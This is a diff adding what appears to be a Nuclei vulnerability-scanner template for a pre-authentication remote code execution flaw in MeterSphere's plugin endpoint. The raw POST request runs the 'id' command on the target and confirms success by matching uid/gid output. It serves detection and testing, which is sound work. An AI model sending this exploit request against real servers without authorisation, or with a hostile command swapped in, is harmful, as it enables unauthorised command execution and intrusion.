@@ -1,0 +1,41 @@
+id: metersphere-plugin-rce
+
+info:
+  name: MeterSphere Plugin Pre-auth RCE
+  author: pdteam
+  severity: critical
+  tags: metersphere,rce
+  reference:
+    - https://y4er.com/post/metersphere-plugincontroller-pre-auth-rce/
+    - https://github.com/metersphere/metersphere
+
+requests:
+  - raw:
+      - |
+        POST /plugin/customMethod HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+        Content-Type: application/json
+
+        {"entry":"Evil","request":"id"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"data":'
+          - '"success":true'
+        condition: and
+
+      - type: regex
+        regex:
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        regex:
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
